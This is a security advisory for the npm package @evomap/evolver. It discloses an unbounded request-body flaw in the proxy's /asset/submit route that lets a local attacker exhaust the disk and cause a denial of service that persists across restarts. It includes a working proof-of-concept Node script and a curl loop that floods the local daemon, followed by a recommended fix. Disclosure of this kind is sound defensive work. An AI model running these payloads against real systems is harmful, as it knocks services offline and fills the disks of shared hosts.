# [M] @evomap/evolver has an unbounded request body in proxy /asset/submit that causes persistent disk-exhaustion DoS

## Summary
Severity: Medium
Advisory: GHSA-7xp7-m392-h92c
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-7xp7-m392-h92c
Type: github-advisory

## Affected
- npm: `@evomap/evolver` — affected >=0 <1.70.0-beta.5

## Details
## Summary

The EvoMap proxy daemon's HTTP body parser accepts requests of any size, and the `POST /asset/submit` route persists the full request body — verbatim and uncapped — as a JSONL line in `<dataDir>/messages.jsonl`. An unauthenticated local attacker (other local user, container neighbor, or malicious npm postinstall script running on the same host) can repeatedly POST large bodies to fill the disk. On restart, the daemon synchronously reads the entire file via `fs.readFileSync`, making the OOM/crash persistent.

## Details

**1. Entry — unbounded body parser** (`src/proxy/server/http.js:9-21`):

```js
function parseBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const raw = Buffer.concat(chunks).toString();
      if (!raw) return resolve({});
      try { resolve(JSON.parse(raw)); }
      catch (e) { reject(new Error('Invalid JSON body')); }
    });
    req.on('error', reject);
  });
}
```

There is no Content-Length validation and no cumulative-bytes cap on `chunks`.

**2. Route — no schema or size validation** (`src/proxy/server/routes.js:75-85`):

```js
'POST /asset/submit': async ({ body }) => {
  if (!body.assets && !body.asset_id) {
    throw Object.assign(new Error('assets or asset_id is required'), { statusCode: 400 });
  }
  const result = store.send({
    type: 'asset_submit',
    payload: body,
    priority: body.priority || 'normal',
  });
  return { body: result };
}
```

The full `body` (including arbitrarily large `body.assets[*].blob`) is forwarded to `store.send()` as the message payload. `POST /mailbox/send` has the same shape.

**3. Sink — unbounded JSONL append** (`src/proxy/mailbox/store.js`):

```js
// line 71-73
function appendLine(filePath, obj) {
  fs.appendFileSync(filePath, JSON.stringify(obj) + '\n', 'utf8');
}

// line 189-209: send() builds a message wrapping the payload and calls _appendMessage
// line 166-171: _appendMessage(msg) -> appendLine(this._messagesFile, msg)
```

Every `/asset/submit` or `/mailbox/send` request appends one JSONL line proportional in size to the request body. `compact()` (line 381) only re-writes existing messages; it does not drop or truncate large rows.

**4. Persistence on restart** (`src/proxy/mailbox/store.js`):

```js
// line 75-86
function readLines(filePath) {
  if (!fs.existsSync(filePath)) return [];
  const content = fs.readFileSync(filePath, 'utf8');  // synchronous, full-file
  ...
}
// line 143-164: _rebuildIndex() called from constructor reads every line
```

A multi-GB `messages.jsonl` will OOM the daemon on every startup, making the DoS persistent across restarts.

**5. Auth model** (`recon.json`, confirmed by inspection of `src/proxy/server/http.js:38` `server.listen(port, '127.0.0.1', ...)`):

> "HTTP proxy has NO per-request auth (bound to 127.0.0.1 only) … No authentication on HTTP /mailbox, /asset, /task, /session, /dm routes."

Any local process can reach the daemon. Local-only access still admits multi-tenant dev hosts, sandboxes, containers sharing the host network namespace, and malicious npm dependency postinstall scripts.

**6. Why not by-design.** The mailbox is documented as a poll/ack message channel for short metadata. Sister code paths in the repo bound their writes (e.g. `appendFailedCapsule` with `FAILED_CAPSULES_MAX = 200`); the absence of any cap on the mailbox path is inconsistent.

## PoC

Run from the repo root:

```js
// poc-asset-submit.js
const http=require('http'),fs=require('fs'),os=require('os'),path=require('path');
const {MailboxStore}=require('./src/proxy/mailbox/store');
const {ProxyHttpServer}=require('./src/proxy/server/http');
const {buildRoutes}=require('./src/proxy/server/routes');
(async()=>{
  const dir=fs.mkdtempSync(path.join(os.tmpdir(),'poc-'));
  const store=new MailboxStore(dir);
  const handlers={assetFetch:async()=>({}),assetSearch:async()=>({}),assetValidate:async()=>({}),atpPost:async()=>({}),atpGet:async()=>({})};
  const srv=new ProxyHttpServer(buildRoutes(store,handlers,null,{}),{port:39922,logger:{log:()=>{},error:()=>{},warn:()=>{}}});
  await srv.start();
  const send=(mb)=>new Promise((res,rej)=>{
    const body='{"assets":[{"asset_id":"sha256:dead","blob":"'+'A'.repeat(mb*1024*1024)+'"}]}';
    const req=http.request({hostname:'127.0.0.1',port:39922,path:'/asset/submit',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}},r=>{r.resume();r.on('end',res);});
    req.on('error',rej); req.write(body); req.end();
  });
  for(let i=0;i<3;i++){await send(10);console.log('messages.jsonl=',fs.statSync(path.join(dir,'messages.jsonl')).size,'bytes');}
  await srv.stop(); fs.rmSync(dir,{recursive:true});
})();
```

Verified output:
```
messages.jsonl= 10486078 bytes
messages.jsonl= 20972156 bytes
messages.jsonl= 31458234 bytes
```

Live exploitation against a running daemon (default port 19820):
```
printf '{"assets":[{"blob":"%s"}]}' "$(head -c 10485760 /dev/zero | tr '\0' A)" > /tmp/big.json
for i in $(seq 1 1000); do
  curl -s -X POST -H 'Content-Type: application/json' --data-binary @/tmp/big.json http://127.0.0.1:19820/asset/submit
done
```

`<dataDir>/messages.jsonl` grows by ~10 MiB per request with no upper bound. After ~N requests, the disk is full or the daemon OOMs on next restart while reading the file.

## Impact

- **Disk exhaustion** of `<dataDir>` filesystem (default `~/.evomap/mailbox/`). Shared filesystems mean co-located services can crash too.
- **Persistent denial of service**: on daemon restart, `_rebuildIndex()` synchronously reads the whole `messages.jsonl` via `fs.readFileSync`, OOM-killing the daemon. Operator must manually delete or truncate the file to recover.
- **Memory exhaustion** during the attack: `Buffer.concat(chunks).toString()` materializes the entire body in memory, so large single requests can also OOM the live daemon before they hit disk.
- **Reachable from low-privilege local actors**: malicious npm dependency postinstall scripts, other unprivileged users on shared dev hosts, processes in sibling containers sharing the host network namespace.

## Recommended Fix

1. Cap body size in `parseBody()` (`src/proxy/server/http.js`):

```js
const MAX_BODY_BYTES = 1 * 1024 * 1024; // 1 MiB

function parseBody(req) {
  return new Promise((resolve, reject) => {
    const declared = Number(req.headers['content-length']);
    if (Number.isFinite(declared) && declared > MAX_BODY_BYTES) {
      const err = new Error('Request body too large');
      err.statusCode = 413;
      return reject(err);
    }
    const chunks = [];
    let received = 0;
    req.on('data', c => {
      received += c.length;
      if (received > MAX_BODY_BYTES) {
        const err = new Error('Request body too large');
        err.statusCode = 413;
        req.destroy();
        return reject(err);
      }
      chunks.push(c);
    });
    req.on('end', () => {
      const raw = Buffer.concat(chunks).toString();
      if (!raw) return resolve({});
      try { resolve(JSON.parse(raw)); }
      catch (e) { reject(new Error('Invalid JSON body')); }
    });
    req.on('error', reject);
  });
}
```

2. Add a per-message payload-size budget in `MailboxStore.send()` / `writeInbound()` (`src/proxy/mailbox/store.js`) — reject messages whose serialized size exceeds e.g. 256 KiB, returning a 413 to the caller.

3. Reject specifically large `body.assets[*].blob` / `body.payload` shapes in `/asset/submit` and `/mailbox/send` handlers in `src/proxy/server/routes.js` before calling `store.send()`.

4. (Defense in depth) In `_rebuildIndex()`, switch `readLines()` to a streaming line reader (`readline.createInterface` over `fs.createReadStream`) so a corrupt or oversized file degrades gracefully instead of OOM-ing on startup.

## References
- https://github.com/EvoMap/evolver/security/advisories/GHSA-7xp7-m392-h92c
- https://github.com/EvoMap/evolver
